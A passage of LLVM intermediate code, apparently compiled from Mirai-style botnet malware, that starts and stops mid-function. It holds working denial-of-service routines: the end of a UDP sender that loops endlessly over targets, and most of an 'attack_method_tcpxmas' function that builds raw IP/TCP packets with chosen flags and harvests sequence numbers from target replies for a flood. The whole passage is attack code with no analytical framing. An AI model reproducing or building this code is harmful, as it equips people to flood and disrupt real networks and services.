  %10 = sext i8 %9 to i64
  %11 = tail call signext i8 @random_hex()
  %12 = sext i8 %11 to i64
  %13 = add nsw i64 %12, %10
  %14 = getelementptr inbounds [31 x i8], [31 x i8]* @.str.2, i64 0, i64 %13
  store i8* %14, i8** %8, align 8
  %15 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 2
  %16 = tail call signext i8 @random_hex()
  %17 = sext i8 %16 to i64
  %18 = tail call signext i8 @random_hex()
  %19 = sext i8 %18 to i64
  %20 = add nsw i64 %19, %17
  %21 = getelementptr inbounds [31 x i8], [31 x i8]* @.str.3, i64 0, i64 %20
  store i8* %21, i8** %15, align 16
  %22 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 3
  %23 = bitcast i8** %22 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.5, i64 0, i64 0)>, <2 x i8*>* %23, align 8
  %24 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 5
  store i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8** %24, align 8
  %25 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 6
  %26 = tail call signext i8 @random_hex()
  %27 = sext i8 %26 to i64
  %28 = tail call signext i8 @random_hex()
  %29 = sext i8 %28 to i64
  %30 = add nsw i64 %29, %27
  %31 = tail call signext i8 @random_hex()
  %32 = sext i8 %31 to i64
  %33 = add nsw i64 %30, %32
  %34 = tail call signext i8 @random_hex()
  %35 = sext i8 %34 to i64
  %36 = add nsw i64 %33, %35
  %37 = tail call signext i8 @random_hex()
  %38 = sext i8 %37 to i64
  %39 = add nsw i64 %36, %38
  %40 = tail call signext i8 @random_hex()
  %41 = sext i8 %40 to i64
  %42 = add nsw i64 %39, %41
  %43 = tail call signext i8 @random_hex()
  %44 = sext i8 %43 to i64
  %45 = add nsw i64 %42, %44
  %46 = tail call signext i8 @random_hex()
  %47 = sext i8 %46 to i64
  %48 = add i64 %45, %47
  %49 = tail call signext i8 @random_hex()
  %50 = sext i8 %49 to i64
  %51 = add i64 %48, %50
  %52 = tail call signext i8 @random_hex()
  %53 = sext i8 %52 to i64
  %54 = add i64 %51, %53
  %55 = tail call signext i8 @random_hex()
  %56 = sext i8 %55 to i64
  %57 = add i64 %54, %56
  %58 = tail call signext i8 @random_hex()
  %59 = sext i8 %58 to i64
  %60 = add i64 %57, %59
  %61 = tail call signext i8 @random_hex()
  %62 = sext i8 %61 to i64
  %63 = add i64 %60, %62
  %64 = tail call signext i8 @random_hex()
  %65 = sext i8 %64 to i64
  %66 = add i64 %63, %65
  %sext = shl i64 %66, 32
  %67 = ashr exact i64 %sext, 32
  %68 = getelementptr inbounds [1 x i8], [1 x i8]* @.str.6, i64 0, i64 %67
  store i8* %68, i8** %25, align 16
  %69 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 7
  %70 = bitcast i8** %69 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)>, <2 x i8*>* %70, align 8
  %71 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 9
  %72 = bitcast i8** %71 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.10, i64 0, i64 0)>, <2 x i8*>* %72, align 8
  %73 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 11
  %74 = bitcast i8** %73 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.11, i64 0, i64 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.12, i64 0, i64 0)>, <2 x i8*>* %74, align 8
  %75 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 13
  %76 = bitcast i8** %75 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i64 0, i64 0)>, <2 x i8*>* %76, align 8
  %77 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 15
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0), i8** %77, align 8
  %78 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 16
  %79 = bitcast i8** %78 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i64 0, i64 0)>, <2 x i8*>* %79, align 16
  %80 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 18
  %81 = bitcast i8** %80 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([174 x i8], [174 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.19, i64 0, i64 0)>, <2 x i8*>* %81, align 16
  %82 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 20
  %83 = bitcast i8** %82 to <2 x i8*>*
  store <2 x i8*> <i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([163 x i8], [163 x i8]* @.str.21, i64 0, i64 0)>, <2 x i8*>* %83, align 16
  %84 = zext i8 %0 to i64
  %85 = tail call noalias i8* @calloc(i64 %84, i64 4) #11
  %86 = bitcast i8* %85 to i32*
  %87 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %88 = trunc i32 %87 to i16
  %89 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %90 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1024)
  %91 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %92 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %92, i8 0, i64 16, i32 4, i1 false)
  %93 = and i32 %89, 65535
  %94 = icmp eq i32 %93, 65535
  br i1 %94, label %98, label %95

; <label>:95:                                     ; preds = %4
  %96 = trunc i32 %89 to i16
  %97 = tail call zeroext i16 @htons(i16 zeroext %96) #12
  br label %98

; <label>:98:                                     ; preds = %4, %95
  %.053 = phi i16 [ %97, %95 ], [ 0, %4 ]
  %99 = icmp eq i8 %0, 0
  br i1 %99, label %.preheader.split.preheader, label %.lr.ph57

.preheader.split.preheader:                       ; preds = %.preheader, %98
  br label %.preheader.split

.lr.ph57:                                         ; preds = %98
  %100 = and i32 %87, 65535
  %101 = icmp eq i32 %100, 65535
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %105 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %106 = zext i8 %0 to i64
  br i1 %101, label %.lr.ph57.split.us.preheader, label %.lr.ph57.split.preheader

.lr.ph57.split.preheader:                         ; preds = %.lr.ph57
  br label %.lr.ph57.split

.lr.ph57.split.us.preheader:                      ; preds = %.lr.ph57
  br label %.lr.ph57.split.us

.lr.ph57.split.us:                                ; preds = %.lr.ph57.split.us.preheader, %123
  %indvars.iv60 = phi i64 [ %indvars.iv.next61, %123 ], [ 0, %.lr.ph57.split.us.preheader ]
  %107 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv60
  %108 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv60, i32 0, i32 1
  store i16 0, i16* %108, align 2
  %109 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %110 = getelementptr inbounds i32, i32* %86, i64 %indvars.iv60
  store i32 %109, i32* %110, align 4
  %111 = icmp eq i32 %109, -1
  br i1 %111, label %.us-lcssa.us.loopexit, label %112

; <label>:112:                                    ; preds = %.lr.ph57.split.us
  store i16 2, i16* %102, align 4
  store i16 %.053, i16* %103, align 2
  store i32 0, i32* %104, align 4
  %113 = call i32 @bind(i32 %109, %struct.sockaddr* nonnull %105, i32 16) #11
  %114 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv60, i32 2
  %115 = load i8, i8* %114, align 4
  %116 = icmp ult i8 %115, 32
  br i1 %116, label %117, label %123

; <label>:117:                                    ; preds = %112
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv60, i32 1
  %119 = load i32, i32* %118, align 4
  %120 = call i32 @ntohl(i32 %119) #12
  %121 = call i32 @htonl(i32 %120) #12
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv60, i32 0, i32 2, i32 0
  store i32 %121, i32* %122, align 4
  br label %123

; <label>:123:                                    ; preds = %117, %112
  %124 = bitcast %struct.attack_target* %107 to %struct.sockaddr*
  %125 = call i32 @connect(i32 %109, %struct.sockaddr* %124, i32 16) #11
  %indvars.iv.next61 = add nuw nsw i64 %indvars.iv60, 1
  %126 = icmp slt i64 %indvars.iv.next61, %106
  br i1 %126, label %.lr.ph57.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %123
  br label %.preheader

.preheader.loopexit69:                            ; preds = %152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit69, %.preheader.loopexit
  br i1 %99, label %.preheader.split.preheader, label %.preheader.split.us.preheader

.preheader.split.us.preheader:                    ; preds = %.preheader
  %wide.trip.count = zext i8 %0 to i64
  br label %.preheader.split.us

.preheader.split.us.loopexit:                     ; preds = %127
  br label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader.split.us.loopexit, %.preheader.split.us.preheader
  br label %127

; <label>:127:                                    ; preds = %127, %.preheader.split.us
  %indvars.iv = phi i64 [ 0, %.preheader.split.us ], [ %indvars.iv.next, %127 ]
  %128 = getelementptr inbounds i32, i32* %86, i64 %indvars.iv
  %129 = load i32, i32* %128, align 4
  %130 = getelementptr inbounds [22 x i8*], [22 x i8*]* %5, i64 0, i64 %indvars.iv
  %131 = load i8*, i8** %130, align 8
  %132 = call i64 @strlen(i8* %131) #14
  %133 = add i64 %132, 1
  %134 = call i64 @send(i32 %129, i8* %131, i64 %133, i32 16384) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %.preheader.split.us.loopexit, label %127

.lr.ph57.split:                                   ; preds = %.lr.ph57.split.preheader, %152
  %indvars.iv62 = phi i64 [ %indvars.iv.next63, %152 ], [ 0, %.lr.ph57.split.preheader ]
  %135 = call zeroext i16 @htons(i16 zeroext %88) #12
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv62
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv62, i32 0, i32 1
  store i16 %135, i16* %137, align 2
  %138 = call i32 @socket(i32 2, i32 2, i32 0) #11
  %139 = getelementptr inbounds i32, i32* %86, i64 %indvars.iv62
  store i32 %138, i32* %139, align 4
  %140 = icmp eq i32 %138, -1
  br i1 %140, label %.us-lcssa.us.loopexit68, label %141

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph57.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit68:                          ; preds = %.lr.ph57.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit68, %.us-lcssa.us.loopexit
  ret void

; <label>:141:                                    ; preds = %.lr.ph57.split
  store i16 2, i16* %102, align 4
  store i16 %.053, i16* %103, align 2
  store i32 0, i32* %104, align 4
  %142 = call i32 @bind(i32 %138, %struct.sockaddr* nonnull %105, i32 16) #11
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv62, i32 2
  %144 = load i8, i8* %143, align 4
  %145 = icmp ult i8 %144, 32
  br i1 %145, label %146, label %152

; <label>:146:                                    ; preds = %141
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv62, i32 1
  %148 = load i32, i32* %147, align 4
  %149 = call i32 @ntohl(i32 %148) #12
  %150 = call i32 @htonl(i32 %149) #12
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv62, i32 0, i32 2, i32 0
  store i32 %150, i32* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %146, %141
  %153 = bitcast %struct.attack_target* %136 to %struct.sockaddr*
  %154 = call i32 @connect(i32 %138, %struct.sockaddr* %153, i32 16) #11
  %indvars.iv.next63 = add nuw nsw i64 %indvars.iv62, 1
  %155 = icmp slt i64 %indvars.iv.next63, %106
  br i1 %155, label %.lr.ph57.split, label %.preheader.loopexit69

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @random_hex() local_unnamed_addr #0 {
  %1 = tail call i32 @rand() #11
  %2 = srem i32 %1, 257
  %3 = trunc i32 %2 to i8
  ret i8 %3
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #7

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #11
  %12 = bitcast i8* %11 to %struct.attack_xmas_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #11
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #11
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre175 = sext i32 %37 to i64
  %.pre176 = add nsw i64 %.pre175, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #11
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161

.lr.ph161:                                        ; preds = %.preheader151
  br i1 %51, label %.lr.ph161.split.us.preheader, label %.lr.ph161.split.preheader

.lr.ph161.split.preheader:                        ; preds = %.lr.ph161
  br label %.lr.ph161.split

.lr.ph161.split.us.preheader:                     ; preds = %.lr.ph161
  br label %.lr.ph161.split.us

.lr.ph161.split.us:                               ; preds = %.lr.ph161.split.us.preheader, %.backedge.us
  %86 = phi i32 [ %133, %.backedge.us ], [ %84, %.lr.ph161.split.us.preheader ]
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0) #11
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %88) #11
  store i16 2, i16* %48, align 4
  %90 = load i32, i32* %5, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 2
  %93 = load i8, i8* %92, align 4
  %94 = icmp ult i8 %93, 32
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 1
  %96 = load i32, i32* %95, align 4
  br i1 %94, label %97, label %100

; <label>:97:                                     ; preds = %.lr.ph161.split.us
  %98 = call i32 @ntohl(i32 %96) #12
  %99 = call i32 @htonl(i32 %98) #12
  br label %100

; <label>:100:                                    ; preds = %97, %.lr.ph161.split.us
  %.sink.us = phi i32 [ %99, %97 ], [ %96, %.lr.ph161.split.us ]
  store i32 %.sink.us, i32* %49, align 4
  store i16 0, i16* %52, align 2
  %101 = call i32 @connect(i32 %86, %struct.sockaddr* nonnull %53, i32 16) #11
  %102 = call i64 @time(i64* null) #11
  br label %103

; <label>:103:                                    ; preds = %127, %100
  store i32 16, i32* %8, align 4
  %104 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #11
  %105 = trunc i64 %104 to i32
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %.loopexit150.loopexit, label %107

; <label>:107:                                    ; preds = %103
  %108 = load i32, i32* %56, align 4
  %109 = load i32, i32* %49, align 4
  %110 = icmp eq i32 %108, %109
  br i1 %110, label %111, label %127

; <label>:111:                                    ; preds = %107
  %sext.us = shl i64 %104, 32
  %112 = ashr exact i64 %sext.us, 32
  %113 = icmp ugt i64 %112, 40
  br i1 %113, label %114, label %127

; <label>:114:                                    ; preds = %111
  %115 = load i16, i16* %58, align 4
  %116 = load i16, i16* %52, align 2
  %117 = icmp eq i16 %115, %116
  br i1 %117, label %118, label %127

; <label>:118:                                    ; preds = %114
  %119 = load i16, i16* %60, align 16
  %120 = and i16 %119, 4608
  %121 = icmp eq i16 %120, 4608
  br i1 %121, label %.us-lcssa.us.loopexit, label %122

; <label>:122:                                    ; preds = %118
  %123 = and i16 %119, 1280
  %124 = icmp eq i16 %123, 0
  br i1 %124, label %127, label %125

; <label>:125:                                    ; preds = %122
  %126 = call i32 @close(i32 %86) #11
  br label %.backedge.us

; <label>:127:                                    ; preds = %122, %114, %111, %107
  %128 = call i64 @time(i64* null) #11
  %129 = sub nsw i64 %128, %102
  %130 = icmp sgt i64 %129, 10
  br i1 %130, label %131, label %103

; <label>:131:                                    ; preds = %127
  %132 = call i32 @close(i32 %86) #11
  br label %.backedge.us

.backedge.us:                                     ; preds = %131, %125
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %134 = icmp eq i32 %133, -1
  br i1 %134, label %.loopexit152.loopexit, label %.lr.ph161.split.us

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi177 = phi i64 [ %.pre176, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre175, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %135 = and i32 %17, 65535
  %136 = icmp eq i32 %135, 65535
  %137 = icmp eq i8 %39, 0
  %138 = add nsw i64 %.pre-phi, 20
  %139 = trunc i64 %138 to i16
  %140 = trunc i64 %138 to i32
  br label %.loopexit

.lr.ph161.split:                                  ; preds = %.lr.ph161.split.preheader, %.backedge
  %141 = phi i32 [ %235, %.backedge ], [ %84, %.lr.ph161.split.preheader ]
  %142 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 3, i32 0) #11
  %143 = or i32 %142, 2048
  %144 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 4, i32 %143) #11
  store i16 2, i16* %48, align 4
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 2
  %148 = load i8, i8* %147, align 4
  %149 = icmp ult i8 %148, 32
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 1
  %151 = load i32, i32* %150, align 4
  br i1 %149, label %152, label %155

; <label>:152:                                    ; preds = %.lr.ph161.split
  %153 = call i32 @ntohl(i32 %151) #12
  %154 = call i32 @htonl(i32 %153) #12
  br label %155

; <label>:155:                                    ; preds = %.lr.ph161.split, %152
  %.sink = phi i32 [ %154, %152 ], [ %151, %.lr.ph161.split ]
  store i32 %.sink, i32* %49, align 4
  %156 = call zeroext i16 @htons(i16 zeroext %24) #12
  store i16 %156, i16* %52, align 2
  %157 = call i32 @connect(i32 %141, %struct.sockaddr* nonnull %53, i32 16) #11
  %158 = call i64 @time(i64* null) #11
  br label %159

; <label>:159:                                    ; preds = %237, %155
  store i32 16, i32* %8, align 4
  %160 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #11
  %161 = trunc i64 %160 to i32
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %.loopexit150.loopexit205, label %163

; <label>:163:                                    ; preds = %159
  %164 = load i32, i32* %56, align 4
  %165 = load i32, i32* %49, align 4
  %166 = icmp eq i32 %164, %165
  br i1 %166, label %167, label %237

; <label>:167:                                    ; preds = %163
  %sext = shl i64 %160, 32
  %168 = ashr exact i64 %sext, 32
  %169 = icmp ugt i64 %168, 40
  br i1 %169, label %170, label %237

; <label>:170:                                    ; preds = %167
  %171 = load i16, i16* %58, align 4
  %172 = load i16, i16* %52, align 2
  %173 = icmp eq i16 %171, %172
  br i1 %173, label %174, label %237

; <label>:174:                                    ; preds = %170
  %175 = load i16, i16* %60, align 16
  %176 = and i16 %175, 4608
  %177 = icmp eq i16 %176, 4608
  br i1 %177, label %.us-lcssa.us.loopexit206, label %230

.us-lcssa.us.loopexit:                            ; preds = %118
  br label %.us-lcssa.us

.us-lcssa.us.loopexit206:                         ; preds = %174
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit206, %.us-lcssa.us.loopexit
  %178 = phi i16 [ %115, %.us-lcssa.us.loopexit ], [ %171, %.us-lcssa.us.loopexit206 ]
  %179 = phi i32 [ %108, %.us-lcssa.us.loopexit ], [ %164, %.us-lcssa.us.loopexit206 ]
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 0
  store i32 %179, i32* %182, align 4
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %184 = load i32, i32* %183, align 4
  %185 = call i32 @ntohl(i32 %184) #12
  %186 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 1
  store i32 %185, i32* %186, align 4
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @ntohl(i32 %188) #12
  %190 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 2
  store i32 %189, i32* %190, align 4
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %192 = load i16, i16* %191, align 2
  %193 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 3
  store i16 %192, i16* %193, align 4
  %194 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 4
  store i16 %178, i16* %194, align 2
  %195 = call noalias i8* @malloc(i64 %62) #11
  %196 = getelementptr inbounds i8*, i8** %14, i64 %181
  store i8* %195, i8** %196, align 8
  %197 = getelementptr inbounds i8, i8* %195, i64 20
  %198 = bitcast i8* %197 to %struct.tcphdr*
  %199 = getelementptr inbounds i8, i8* %195, i64 40
  store i8 69, i8* %195, align 4
  %200 = getelementptr inbounds i8, i8* %195, i64 1
  store i8 %16, i8* %200, align 1
  %201 = call zeroext i16 @htons(i16 zeroext %63) #12
  %202 = getelementptr inbounds i8, i8* %195, i64 2
  %203 = bitcast i8* %202 to i16*
  store i16 %201, i16* %203, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %18) #12
  %205 = getelementptr inbounds i8, i8* %195, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 %204, i16* %206, align 4
  %207 = getelementptr inbounds i8, i8* %195, i64 8
  store i8 %20, i8* %207, align 4
  br i1 %64, label %212, label %208

; <label>:208:                                    ; preds = %.us-lcssa.us
  %209 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %210 = getelementptr inbounds i8, i8* %195, i64 6
  %211 = bitcast i8* %210 to i16*
  store i16 %209, i16* %211, align 2
  br label %212

